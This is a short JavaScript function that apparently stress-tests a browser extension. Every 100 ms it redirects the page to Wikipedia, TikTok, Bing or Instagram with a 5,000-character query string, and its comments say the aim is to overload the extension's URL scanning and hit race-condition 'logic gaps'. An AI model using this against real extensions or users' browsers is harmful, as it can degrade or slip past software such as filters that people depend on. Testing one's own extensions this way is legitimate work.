function startRace() {
    let i = 0;
    
    // We define the base URLs here
    let baseUrls = [
        "https://www.wikipedia.org", 
        "https://www.tiktok.com", 
        "https://www.bing.com",
        "https://www.instagram.com"
    ];

    setInterval(() => {
        // Pick a base URL
        let base = baseUrls[i % baseUrls.length];
        
        // Add a massive, changing query string to force the extension 
        // to re-scan a huge string every 50ms.
        // We use .href to force a "real" navigation event.
        let heavyUrl = base + "/?data=" + "A".repeat(5000) + "&v=" + i;
        
        window.location.href = heavyUrl;
        
        i++;
    }, 100); // 100ms is usually the 'sweet spot' for catching logic gaps
}
